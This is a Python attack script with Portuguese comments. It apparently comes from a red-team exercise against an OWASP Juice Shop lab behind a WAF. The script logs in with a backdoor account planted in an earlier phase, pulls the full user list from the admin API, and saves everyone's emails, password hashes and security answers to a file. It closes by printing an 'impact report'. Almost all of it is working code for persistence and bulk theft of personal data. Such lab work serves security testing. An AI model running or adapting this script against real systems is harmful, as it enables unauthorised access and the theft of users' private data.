import requests
import json
import time

# --- Alvos e Credenciais de Persistência ---
TARGET_BASE = "http://defense-waf:8080"
BACKDOOR_AUTH = {
    "email": "support_audit_internal@juice-sh.op",
    "password": "MetatronPersistence2026!"
}

FINAL_DATA_DUMP = "exfiltrated_users.json"

def get_persistence_token():
    """Realiza o login com a conta backdoor criada na fase anterior"""
    print(f"[*] Autenticando com conta de persistência: {BACKDOOR_AUTH['email']}...")
    url = f"{TARGET_BASE}/rest/user/login"
    try:
        res = requests.post(url, json=BACKDOOR_AUTH, timeout=5)
        if res.status_code == 200:
            token = res.json().get("authentication", {}).get("token")
            print("[+] Token de persistência obtido com sucesso.")
            return token
        else:
            print(f"[-] Falha na autenticação: {res.status_code}")
            return None
    except Exception as e:
        print(f"[-] Erro de conexão: {e}")
        return None

def dump_user_database(token):
    """T1041: Exfiltração via API de Administração"""
    print("[*] Iniciando Extração Massiva de Dados (PII Exfiltration)...")
    
    # Endpoint que retorna a lista completa de usuários
    url = f"{TARGET_BASE}/api/Users"
    headers = {"Authorization": f"Bearer {token}"}
    
    try:
        res = requests.get(url, headers=headers, timeout=10)
        
        if res.status_code == 200:
            user_data = res.json().get("data", [])
            print(f"[!!!] SUCESSO: {len(user_data)} registros de usuários capturados.")
            
            # Persistência do Dump para análise forense
            with open(FINAL_DATA_DUMP, "w") as f:
                json.dump(user_data, f, indent=2)
            
            print(f"[#] Base de dados salva em: {FINAL_DATA_DUMP}")
            return user_data
        else:
            print(f"[-] Erro na exfiltração: {res.status_code} - {res.text[:100]}")
            return None
    except Exception as e:
        print(f"[-] Falha crítica durante o dump: {e}")
        return None

def run_impact_simulation():
    token = get_persistence_token()
    if token:
        data = dump_user_database(token)
        if data:
            print("\n" + "="*50)
            print("RELATÓRIO DE IMPACTO DE EXFILTRAÇÃO")
            print("="*50)
            print(f"Total de PII vazado: {len(data)} contas")
            print(f"Campos expostos: Email, Password Hash, Security Answer, CreatedAt")
            print(f"Nível de Severidade: CRÍTICO (Violação de Privacidade)")
            print("="*50)

if __name__ == "__main__":
    run_impact_simulation()
